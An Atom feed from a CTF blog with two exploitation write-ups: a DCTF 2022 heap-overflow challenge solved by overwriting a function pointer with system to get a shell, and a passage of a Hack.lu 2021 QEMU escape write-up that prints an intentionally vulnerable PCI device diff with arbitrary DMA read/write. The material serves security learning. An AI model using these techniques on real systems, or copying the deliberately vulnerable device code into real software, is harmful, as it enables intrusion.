<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[heap on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/heap/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/heap/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2022-07-18T22:45:46+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/heap/</id>
        
        <entry>
            <title type="html"><![CDATA[[DCTF 2022 - pwn] phonebook]]></title>
            <link href="https://nasm.re/posts/phonebook/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/phonebook/</id>
            
            <published>2022-04-17T00:00:00+00:00</published>
            <updated>2022-04-17T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="intro">
        Intro
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#intro" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Intro" href="#intro">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>phonebook is a basic heap challenge I did during the dctf event. It&rsquo;s basically just a heap overflow wich allows us to overflow a function pointer with for example the address of system.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="the-bug">
        The bug
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#the-bug" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor The bug" href="#the-bug">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<pre tabindex="0"><code>$ ./phonebook
Choose an option: [1-5]
1. Store someone's information
2. Edit information
3. Call someone
4. Unfriend someone
5. Add the hidden_note
&gt; 
</code></pre><p>We can create an entity and then initialize: a name, a numero and a function pointer.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">create</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Person with id %d already exists!&#34;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20uLL</span><span class="p">);</span>
  <span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">get_name</span><span class="p">();</span>
  <span class="n">LODWORD</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Phone number: &#34;</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span> <span class="c1">// phone number
</span><span class="c1"></span>  <span class="n">s</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">choose_relation</span><span class="p">();</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
  <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The bug lies <code>edit_name</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">name_size</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">];</span>
  <span class="n">name_size</span> <span class="o">=</span> <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name length: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">name_size</span> <span class="o">!=</span> <span class="n">n</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
    <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
  <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>We can give it a new lentgh and if that&rsquo;s not equal to the current size field it frees the current name pointer and allocates a new name pointer <strong>without</strong> updating the size field. Which means if we edit the name pointer with a smaller size, the name pointer will be smaller compared to the size field, then we just have to edit again the size field to make it equal to <code>v4-&gt;name_size</code> to trigger a heap overflow through the <code>v4-&gt;name</code> pointer.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="leak-libc">
        Leak libc
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#leak-libc" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak libc" href="#leak-libc">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Now we&rsquo;re able to overflow through the name pointer we have to find how the leak the libc, a nice way would be to leak it by using free&rsquo;d chunks in the unsortedbin. Or we can leak the <code>entity-&gt;func</code> function pointer which would give us a leak of the binary base address, then we would have to edit the name pointer with the got entry of <code>puts</code> to leak its address within the libc.</p>
<p>To do so we can create another entity right after the name pointer:</p>
<pre tabindex="0"><code>0x559b0d4d16b0	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d16c0	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
0x559b0d4d16d0	0x0000559b0d4d1800	0x00000000000000fe	..M..U..........
0x559b0d4d16e0	0x0000000000000000	0x0000000000000111	................
0x559b0d4d16f0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1700	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1710	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1720	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1730	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1740	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1750	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1760	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1770	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1780	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1790	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17b0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17c0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17d0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17e0	0x4141414141414141	0x0000414141414141	AAAAAAAAAAAAAA..
0x559b0d4d17f0	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d1800	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x559b0d4d1810	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x559b0d4d1820	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d1830	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
0x559b0d4d1840	0x0000559b0c851fa0	0x000000000000000a	.....U..........
0x559b0d4d1850	0x0000000000000000	0x000000000001f7b1	................	 &lt;-- Top chunk
</code></pre><p>The <code>edit_phone_number</code> overwrites the null byte:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_phone_number</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter new phone number: &#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%8s&#34;</span><span class="p">,</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div><p>To summarise:</p>
<ul>
<li>leak binary base address by overwriting the null byte (<code>edit_phone_number</code>) and then print the phone numer.</li>
<li>leak libc base address by overwriting the name field of the second entity with the got entry of <code>puts</code></li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Then we just have to overwrite the function pointer with the address of <code>system</code> which takes as first argument a pointer to the entity structure of edit the phone number of the entity we wanna use because that&rsquo;s the first field of the structure which means we make it equivalent to a <code>system(&quot;/bin/sh&quot;)</code>.</p>
<pre tabindex="0"><code>00000000 entity          struc ; (sizeof=0x20, mappedto_8)
00000000 num             dq ?
00000008 func            dq ?
00000010 name            dq ?                    ; offset
00000018 name_size       dq ?
00000020 entity          ends
</code></pre><p>Then here we are:</p>
<pre tabindex="0"><code>$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
[*] '/home/nasm/Documents/phonebook/chall/phonebook_patched_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Opening connection to 51.124.222.205 on port 13380: Done
[*] binary: 0x558980fdd000
[*] libc @ 0x7fabfec57000
[*] system @ 0x7fabfeca92c0
[*] Switching to interactive mode
$ id
uid=1337 gid=1337 groups=1337
$ cat flag.txt
DCTF{C4n_1_g3t_y0ur_numb3r?}
</code></pre>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/dctf" term="dctf" label="dctf" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[Hack.lu 2021 - pwn] Cloudinspect]]></title>
            <link href="https://nasm.re/posts/cloudinspect/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/cloudinspect/</id>
            
            <published>2021-11-07T00:00:00+00:00</published>
            <updated>2021-11-07T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="cloudinspect">
        CloudInspect
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#cloudinspect" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor CloudInspect" href="#cloudinspect">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>CloundInpect was a hypervisor exploitation challenge I did for the <a
  class="gblog-markdown__link"
  href="https://flu.xxx"
  
  >Hack.lu event</a
>.
I didn&rsquo;t succeed to flag it within the 48 hours :(. But anyway I hope this write up will be interesting to read!
The related files can be found <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2021/hack.lu/pwn/cloudinspect"
  
  >right here</a
></p>
<blockquote>
<p>After Whiterock released it&rsquo;s trading bot cloud with special Stonks Sockets another hedge fund, Castel, comes with some competition. The special feature here is called &ldquo;cloudinspect&rdquo;.<br>
The <code>flag</code> is located right next to the hypervisor. Go get it!</p>
</blockquote>
<div class="gblog-post__anchorwrap">
    <h2 id="vulnerable-pci-device">
        Vulnerable PCI device
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#vulnerable-pci-device" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Vulnerable PCI device" href="#vulnerable-pci-device">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>We got several files:</p>
<pre tabindex="0"><code>$ ls
build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
</code></pre><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
</span><span class="gh"></span>new file mode 100644
<span class="gh">index 0000000000..f1c3f84b2a
</span><span class="gh"></span><span class="gd">--- /dev/null
</span><span class="gd"></span><span class="gi">+++ b/hw/misc/cloudinspect.c
</span><span class="gi"></span><span class="gu">@@ -0,0 +1,204 @@
</span><span class="gu"></span><span class="gi">+/*
</span><span class="gi">+ * QEMU cloudinspect intentionally vulnerable PCI device
</span><span class="gi">+ *
</span><span class="gi">+ */
</span><span class="gi">+
</span><span class="gi">+#include &#34;qemu/osdep.h&#34;
</span><span class="gi">+#include &#34;qemu/units.h&#34;
</span><span class="gi">+#include &#34;hw/pci/pci.h&#34;
</span><span class="gi">+#include &#34;hw/hw.h&#34;
</span><span class="gi">+#include &#34;hw/pci/msi.h&#34;
</span><span class="gi">+#include &#34;qom/object.h&#34;
</span><span class="gi">+#include &#34;qemu/module.h&#34;
</span><span class="gi">+#include &#34;qapi/visitor.h&#34;
</span><span class="gi">+#include &#34;sysemu/dma.h&#34;
</span><span class="gi">+
</span><span class="gi">+#define TYPE_PCI_CLOUDINSPECT_DEVICE &#34;cloudinspect&#34;
</span><span class="gi">+typedef struct CloudInspectState CloudInspectState;
</span><span class="gi">+DECLARE_INSTANCE_CHECKER(CloudInspectState, CLOUDINSPECT,
</span><span class="gi">+                         TYPE_PCI_CLOUDINSPECT_DEVICE)
</span><span class="gi">+
</span><span class="gi">+#define DMA_SIZE        4096
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98
</span><span class="gi">+
</span><span class="gi">+#define CLOUDINSPECT_VENDORID 0x1337
</span><span class="gi">+#define CLOUDINSPECT_DEVICEID 0x1337
</span><span class="gi">+#define CLOUDINSPECT_REVISION 0xc1
</span><span class="gi">+
</span><span class="gi">+#define CLOUDINSPECT_DMA_GET_VALUE      0x1
</span><span class="gi">+#define CLOUDINSPECT_DMA_PUT_VALUE      0x2
</span><span class="gi">+
</span><span class="gi">+struct CloudInspectState {
</span><span class="gi">+    PCIDevice pdev;
</span><span class="gi">+    MemoryRegion mmio;
</span><span class="gi">+    AddressSpace *as;
</span><span class="gi">+
</span><span class="gi">+    struct dma_state {
</span><span class="gi">+        dma_addr_t src;
</span><span class="gi">+        dma_addr_t dst;
</span><span class="gi">+        dma_addr_t cnt;
</span><span class="gi">+        dma_addr_t cmd;
</span><span class="gi">+    } dma;
</span><span class="gi">+    char dma_buf[DMA_SIZE];
</span><span class="gi">+};
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_dma_rw(CloudInspectState *cloudinspect, bool write)
</span><span class="gi">+{
</span><span class="gi">+    if (write) {
</span><span class="gi">+        uint64_t dst = cloudinspect-&gt;dma.dst;
</span><span class="gi">+        // DMA_DIRECTION_TO_DEVICE: Read from an address space to PCI device
</span><span class="gi">+        dma_memory_read(cloudinspect-&gt;as, cloudinspect-&gt;dma.src, cloudinspect-&gt;dma_buf + dst, cloudinspect-&gt;dma.cnt);
</span><span class="gi">+    } else {
</span><span class="gi">+        uint64_t src = cloudinspect-&gt;dma.src;
</span><span class="gi">+        // DMA_DIRECTION_FROM_DEVICE: Write to address space from PCI device
</span><span class="gi">+        dma_memory_write(cloudinspect-&gt;as, cloudinspect-&gt;dma.dst, cloudinspect-&gt;dma_buf + src, cloudinspect-&gt;dma.cnt);
</span><span class="gi">+    }
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static bool cloudinspect_DMA_op(CloudInspectState *cloudinspect, bool write) {
</span><span class="gi">+    switch (cloudinspect-&gt;dma.cmd) {
</span><span class="gi">+        case CLOUDINSPECT_DMA_GET_VALUE:
</span><span class="gi">+        case CLOUDINSPECT_DMA_PUT_VALUE:
</span><span class="gi">+            if (cloudinspect-&gt;dma.cnt &gt; DMA_SIZE) {
</span><span class="gi">+                return false;
</span><span class="gi">+            }
</span><span class="gi">+            cloudinspect_dma_rw(cloudinspect, write);
</span><span class="gi">+            break;
</span><span class="gi">+        default:
</span><span class="gi">+            return false;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    return true;
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static uint64_t cloudinspect_mmio_read(void *opaque, hwaddr addr, unsigned size)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = opaque;
</span><span class="gi">+    uint64_t val = ~0ULL;
</span><span class="gi">+
</span><span class="gi">+    switch (addr) {
</span><span class="gi">+    case 0x00:
</span><span class="gi">+        val = 0xc10dc10dc10dc10d;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
</span><span class="gi">+        val = cloudinspect-&gt;dma.cmd;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
</span><span class="gi">+        val = cloudinspect-&gt;dma.src;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
</span><span class="gi">+        val = cloudinspect-&gt;dma.dst;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
</span><span class="gi">+        val = cloudinspect-&gt;dma.cnt;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
</span><span class="gi">+        val = cloudinspect_DMA_op(cloudinspect, false);
</span><span class="gi">+        break;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    return val;
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_mmio_write(void *opaque, hwaddr addr, uint64_t val,
</span><span class="gi">+                unsigned size)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = opaque;
</span><span class="gi">+
</span><span class="gi">+    switch (addr) {
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
</span><span class="gi">+        cloudinspect-&gt;dma.cmd = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
</span><span class="gi">+        cloudinspect-&gt;dma.src = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
</span><span class="gi">+        cloudinspect-&gt;dma.dst = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
</span><span class="gi">+        cloudinspect-&gt;dma.cnt = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
</span><span class="gi">+        val = cloudinspect_DMA_op(cloudinspect, true);
</span><span class="gi">+        break;
</span><span class="gi">+    }
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static const MemoryRegionOps cloudinspect_mmio_ops = {
</span><span class="gi">+    .read = cloudinspect_mmio_read,
</span><span class="gi">+    .write = cloudinspect_mmio_write,
</span><span class="gi">+    .endianness = DEVICE_NATIVE_ENDIAN,
</span><span class="gi">+    .valid = {
</span><span class="gi">+        .min_access_size = 4,
</span><span class="gi">+        .max_access_size = 8,
</span><span class="gi">+    },
</span><span class="gi">+    .impl = {
</span><span class="gi">+        .min_access_size = 4,
</span><span class="gi">+        .max_access_size = 8,
</span><span class="gi">+    },
</span><span class="gi">+
</span><span class="gi">+};
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_realize(PCIDevice *pdev, Error **errp)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
</span><span class="gi">+    // uint8_t *pci_conf = pdev-&gt;config;
</span><span class="gi">+
</span><span class="gi">+    if (msi_init(pdev, 0, 1, true, false, errp)) {
</span><span class="gi">+        return;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    cloudinspect-&gt;as = &amp;address_space_memory;
</span><span class="gi">+    memory_region_init_io(&amp;cloudinspect-&gt;mmio, OBJECT(cloudinspect), &amp;cloudinspect_mmio_ops, cloudinspect,
</span><span class="gi">+                    &#34;cloudinspect-mmio&#34;, 1 * MiB);
</span><span class="gi">+    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;cloudinspect-&gt;mmio);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_uninit(PCIDevice *pdev)
</span><span class="gi">+{
</span><span class="gi">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
</span><span class="gi">+
</span><span class="gi">+    msi_uninit(pdev);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_instance_init(Object *obj)
</span><span class="gi">+{
</span><span class="gi">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(obj);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_class_init(ObjectClass *class, void *data)
</span><span class="gi">+{
</span><span class="gi">+    DeviceClass *dc = DEVICE_CLASS(class);
</span><span class="gi">+    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);
</span><span class="gi">+
</span><span class="gi">+    k-&gt;realize = pci_cloudinspect_realize;
</span><span class="gi">+    k-&gt;exit = pci_cloudinspect_uninit;
</span><span class="gi">+    k-&gt;vendor_id = CLOUDINSPECT_VENDORID;
</span><span class="gi">+    k-&gt;device_id = CLOUDINSPECT_DEVICEID;
</span><span class="gi">+    k-&gt;revision = CLOUDINSPECT_REVISION;
</span><span class="gi">+    k-&gt;class_id = PCI_CLASS_OTHERS;
</span><span class="gi">+    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_register_types(void)
</span><span class="gi">+{
</span><span class="gi">+    static InterfaceInfo interfaces[] = {
</span><span class="gi">+        { INTERFACE_CONVENTIONAL_PCI_DEVICE },
</span><span class="gi">+        { },
</span><span class="gi">+    };
</span><span class="gi">+    static const TypeInfo cloudinspect_info = {
</span><span class="gi">+        .name          = TYPE_PCI_CLOUDINSPECT_DEVICE,
</span><span class="gi">+        .parent        = TYPE_PCI_DEVICE,
</span><span class="gi">+        .instance_size = sizeof(CloudInspectState),
</span><span class="gi">+        .instance_init = cloudinspect_instance_init,
</span><span class="gi">+        .class_init    = cloudinspect_class_init,
</span><span class="gi">+        .interfaces = interfaces,
</span><span class="gi">+    };
</span><span class="gi">+
</span><span class="gi">+    type_register_static(&amp;cloudinspect_info);
</span><span class="gi">+}
</span><span class="gi">+type_init(pci_cloudinspect_register_types)
</span><span class="gi"></span><span class="gh">diff --git a/hw/misc/meson.build b/hw/misc/meson.build
</span><span class="gh">index 1cd48e8a0f..5ff263ca2f 100644
</span><span class="gh"></span><span class="gd">--- a/hw/misc/meson.build
</span><span class="gd"></span><span class="gi">+++ b/hw/misc/meson.build
</span><span class="gi"></span><span class="gu">@@ -1,5 +1,6 @@
</span><span class="gu"></span> softmmu_ss.add(when: &#39;CONFIG_APPLESMC&#39;, if_true: files(&#39;applesmc.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_EDU&#39;, if_true: files(&#39;edu.c&#39;))
<span class="gi">+softmmu_ss.add(files(&#39;cloudinspect.c&#39;))
</span><span class="gi"></span> softmmu_ss.add(when: &#39;CONFIG_FW_CFG_DMA&#39;, if_true: files(&#39;vmcoreinfo.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_ISA_DEBUG&#39;, if_true: files(&#39;debugexit.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_ISA_TESTDEV&#39;, if_true: files(&#39;pc-testdev.c&#39;))
</code></pre></div><p>The first thing I did when I saw this was to check out how <code>memory_region_init_io</code> and <code>pci_register_bar</code> functions work. It sounds a bit like like a kernel device which registers a few handlers for basic operations like read / write / ioctl. Very quickly I found two write up from dangokyo <a
  class="gblog-markdown__link"
  href="https://dangokyo.me/2018/03/28/qemu-internal-pci-device/"
  
  >this one</a
>  and <a
  class="gblog-markdown__link"
  href="https://dangokyo.me/2018/03/25/hitb-xctf-2017-babyqemu-write-up/"
  
  >this other one</a
>, I recommend you to check it out, they are pretty interesting and well written.</p>
<p>PCI stands for Peripheral Component Interconnect, that&rsquo;s a standard that describes the interactions between the cpu and the other physical devices. The PCI device handles the interactions between the system and the physical device. To do so,  the PCI handler is providing a physical address space to the kernel, reachable through the kernel abstractions from a particular virtual address space. This address can be used to cache some data, but that&rsquo;s mainly used to request a particular behavior from the kernel to the physical devices. These requests are written at a well defined offset in the PCI address space, that are the I/O registers. And in the same way, the devices are waiting for some values at these locations to trigger a particular behavior. Check out <a
  class="gblog-markdown__link"
  href="https://tldp.org/LDP/tlk/dd/pci.html"
  
  >this</a
> and <a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/html/latest/PCI/pci.html#mmio-space-and-write-posting"
  
  >this</a
> to learn more about PCI devices!</p>
<p>Now we know a bit more about PCI devices, we can see that the patched code is a PCI interface between the linux guest operating system and .. <em>nothing</em>. That&rsquo;s just a vulnerable PCI device which allows us to read and write four I/O registers (<code>CNT</code>, <code>SRC</code>, <code>CMD</code> and <code>DST</code>). According to these registers, we can read and write at an arbitrary location. There is a check about the size we&rsquo;re requesting for read / write operations at a particular offset from the <code>dmabuf</code> base address, but since we control the offset it does not matter.</p>
<p>To write these registers from userland, we need to <code>mmap</code> the right <code>resource</code> file corresponding to the PCI device. Then we just have to read or write the mapped file at an offset corresponding to the the register we want to read / write. Furthermore, the arbitrary read / write primitives provided by the device need to read to / from a memory area from its physical address the data we want to read / write.</p>
<p>The resource file can be found by getting a shell on the machine to take a look at the output of the <code>lspci</code> command.</p>
<pre tabindex="0"><code>/ # lspci -v
00:01.0 Class 0601: 8086:7000
00:00.0 Class 0600: 8086:1237
